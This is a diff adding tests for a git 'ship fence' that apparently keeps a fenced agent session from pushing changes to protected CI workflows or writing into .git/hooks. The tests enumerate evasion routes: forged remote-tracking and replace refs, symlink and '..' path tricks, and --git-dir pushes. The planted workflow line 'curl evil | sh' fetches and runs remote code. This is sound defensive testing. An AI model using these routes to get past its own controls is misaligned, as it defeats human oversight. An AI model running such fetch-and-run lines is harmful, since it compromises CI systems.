@@ -4,7 +4,7 @@ import * as fs from "node:fs";
 import * as path from "node:path";
 import shipFence from "../ship-fence";
 import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
-import { armFence, currentState, disarmFence, FENCE_ENV, installFence, readState, SHIM_DIR, stateDir } from "./fence-state";
+import { armFence, checkPushContent, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, SHIM_DIR, stateDir } from "./fence-state";
 import { checkToolCall } from "./fence-tools";
 
 const BRANCH = "feat/ship-s1";
@@ -194,6 +194,192 @@ describe("the shims, with real git", () => {
 		sh(repo, "switch", "--quiet", BRANCH);
 		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
 		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+	});
+
+	const bare = () => path.join(privateHome(), "remote.git");
+	/** What origin holds for `branch`: a commit id, or "" when it has no such branch. */
+	const originHas = (branch: string) => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(objectname)", `refs/heads/${branch}`], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
+	/** Commits the workflow change a fenced session may not push, and returns that commit. */
+	const evilWorkflow = (): string => {
+		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
+		sh(repo, "commit", "--quiet", "-am", "tweak");
+		return sh(repo, "rev-parse", "HEAD").trim();
+	};
+	/** A second clone of origin, where someone else works, on `BRANCH`; its git folder is `gitdir` when given. */
+	const teammate = (gitdir?: string): string => {
+		const dir = path.join(privateHome(), "projects", "other");
+		sh(privateHome(), "clone", "--quiet", ...(gitdir ? ["--separate-git-dir", gitdir] : []), bare(), dir);
+		sh(dir, "switch", "--quiet", "-c", BRANCH);
+		return dir;
+	};
+
+	describe("the push check reads origin itself, not the remote-tracking refs the session can move", () => {
+		const planted: [string, (evil: string) => void][] = [
+			["update-ref on the branch's tracking ref", evil => sh(repo, "update-ref", `refs/remotes/origin/${BRANCH}`, evil)],
+			["update-ref on origin/main, which is the base", evil => sh(repo, "update-ref", "refs/remotes/origin/main", evil)],
+			["fetch . onto the branch's tracking ref", () => sh(repo, "fetch", "--quiet", ".", `HEAD:refs/remotes/origin/${BRANCH}`)],
+			["origin/HEAD pointed at a ref that holds the change", evil => {
+				sh(repo, "update-ref", "refs/remotes/origin/evil", evil);
+				sh(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/evil");
+			}],
+		];
+		for (const [name, plant] of planted) {
+			test(name, () => {
+				armFence({ pushBranch: BRANCH, root: repo });
+				plant(evilWorkflow());
+				const push = git(process.env, "push", "origin", BRANCH);
+				expect(push.status).toBe(1);
+				expect(push.stderr).toContain("would change .github/workflows/ci.yml");
+				expect(originHas(BRANCH)).toBe("");
+			});
+		}
+	});
+
+	test("update-ref and fetch . onto remote-tracking refs are refused by the shim, and the change stays off origin", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const evil = evilWorkflow();
+		for (const args of [["update-ref", `refs/remotes/origin/${BRANCH}`, evil], ["update-ref", "refs/remotes/origin/main", evil], ["fetch", ".", `HEAD:refs/remotes/origin/${BRANCH}`]]) {
+			const r = git(process.env, ...args);
+			expect(r.status).toBe(1);
+			expect(r.stderr).toContain("ship fence");
+		}
+		expect(sh(repo, "for-each-ref", "--format=%(objectname)", "refs/remotes")).not.toContain(evil);
+		expect(git(process.env, "push", "origin", BRANCH).status).toBe(1);
+		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("a replacement ref does not show the push check another tree than the one the push sends", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const benign = sh(repo, "rev-parse", "HEAD").trim();
+		const evil = evilWorkflow();
+		expect(git(process.env, "update-ref", `refs/replace/${evil}`, benign).status).toBe(1);
+		sh(repo, "update-ref", `refs/replace/${evil}`, benign);
+		const push = git(process.env, "push", "origin", BRANCH);
+		expect(push.status).toBe(1);
+		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
+		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("only origin's own branch counts as its tip: ls-remote also lists refs whose name merely ends the same way", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const evil = evilWorkflow();
+		// Someone else put the change on a branch named like the watched one's full ref name.
+		sh(repo, "push", "--quiet", "origin", `${evil}:refs/heads/refs/heads/${BRANCH}`);
+		const push = git(process.env, "push", "origin", BRANCH);
+		expect(push.status).toBe(1);
+		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
+		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("moving a protected file away is a change to it", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		fs.mkdirSync(path.join(repo, "docs"));
+		sh(repo, "mv", ".github/workflows/ci.yml", "docs/ci.yml");
+		sh(repo, "commit", "--quiet", "-m", "move the workflow");
+		const push = git(process.env, "push", "origin", BRANCH);
+		expect(push.status).toBe(1);
+		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
+		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("git that writes where it is told does not write into the git folder, however it is reached", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const hooks = path.join(repo, ".git", "hooks");
+		const template = path.join(privateHome(), "template");
+		write(path.join(template, "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
+		fs.chmodSync(path.join(template, "hooks", "pre-commit"), 0o755);
+		fs.symlinkSync(".git/hooks", path.join(repo, "hk"));
+		for (const args of [
+			["diff", "--output=.git/hooks/pre-commit"],
+			["archive", "-o", ".git/hooks/pre-commit", "HEAD"],
+			["checkout-index", "--prefix=.git/hooks/", "-a"],
+			["bundle", "create", ".git/hooks/pre-commit", "HEAD"],
+			["init", `--template=${template}`],
+			["-C", "src", "archive", "-o", "../.git/hooks/pre-commit", "HEAD"],
+			["archive", "-o", path.join(hooks, "pre-commit"), "HEAD"],
+			["archive", "-o", "hk/pre-commit", "HEAD"],
+			["--work-tree=.git/hooks", "checkout", "HEAD", "--", "src/a.ts"],
+			// A `..` after a symlink leaves the link's target, so these reach .git itself.
+			["checkout-index", "--prefix=hk/../", "-f", "src/a.ts"],
+			["-C", "hk/..", "archive", "-o", "config", "HEAD"],
+		]) {
+			const r = git(process.env, ...args);
+			expect(r.status).toBe(1);
+			expect(r.stderr).toContain("ship fence");
+		}
+		const inside = spawnSync("git", ["archive", "-o", "pre-commit", "HEAD"], { cwd: hooks, env: process.env, encoding: "utf8" });
+		expect(inside.status).toBe(1);
+		expect(fs.readdirSync(hooks).filter(name => !name.endsWith(".sample"))).toEqual([]);
+		expect(fs.existsSync(path.join(repo, ".git", "src"))).toBe(false);
+		expect(sh(repo, "config", "--get", "remote.origin.url")).toContain("remote.git");
+	});
+
+	test("a push run against another repo with --git-dir is refused, so the check always reads the repo that pushes", () => {
+		const gitdir = path.join(privateHome(), "other-gd");
+		const other = teammate(gitdir);
+		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
+		sh(other, "commit", "--quiet", "-am", "tweak");
+		armFence({ pushBranch: BRANCH, root: repo });
+		const push = git(process.env, "--git-dir", gitdir, "push", "origin", BRANCH);
+		expect(push.status).toBe(1);
+		expect(push.stderr).toContain("--git-dir");
+		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("a push waits for a fetch while origin holds a commit this checkout lacks; then it goes", () => {
+		const other = teammate();
+		write(path.join(other, "src/b.ts"), "export const b = 1;\n");
+		sh(other, "add", "-A");
+		sh(other, "commit", "--quiet", "-m", "teammate");
+		sh(other, "push", "--quiet", "origin", BRANCH);
+		armFence({ pushBranch: BRANCH, root: repo });
+		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
+		sh(repo, "commit", "--quiet", "-am", "mine");
+		const blocked = git(process.env, "push", "origin", BRANCH);
+		expect(blocked.status).toBe(1);
+		expect(blocked.stderr).toContain("fetch origin first");
+		expect(blocked.stderr).not.toContain("This is final");
+		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
+		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
+		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+
+		write(path.join(other, "README.md"), "base moved\n");
+		sh(other, "add", "-A");
+		sh(other, "commit", "--quiet", "-m", "base moves");
+		sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
+		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
+		sh(repo, "commit", "--quiet", "-am", "mine again");
+		expect(git(process.env, "push", "origin", BRANCH).stderr).toContain("fetch origin first");
+		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
+		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+	});
+
+	test("a protected change the branch held when /ship armed, or origin's branch already holds, is not the push's", () => {
+		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [pull_request]\n");
+		sh(repo, "commit", "--quiet", "-am", "the user's own edit");
+		armFence({ pushBranch: BRANCH, root: repo });
+		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
+		sh(repo, "commit", "--quiet", "-am", "session fix");
+		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+
+		const other = teammate();
+		sh(other, "fetch", "--quiet", "origin", BRANCH);
+		sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
+		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
+		sh(other, "commit", "--quiet", "-am", "teammate edits the workflow");
+		sh(other, "push", "--quiet", "origin", BRANCH);
+		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
+		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
+		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
+		sh(repo, "commit", "--quiet", "-am", "session fix 2");
+		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+	});
+
+	test("a push is refused, not waved through, when origin can't be read", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const down: Git = (dir, ...args) => (args[0] === "ls-remote" ? { code: 128, out: "" } : realGit(dir, ...args));
+		expect(checkPushContent(repo, [BRANCH], currentState(), down)).toContain("origin");
+		expect(checkPushContent(repo, [BRANCH], { ...currentState(), pushBranch: null })).toContain("pushes nothing");
 	});
 
 	test("a call whose environment lost the state name is refused", () => {
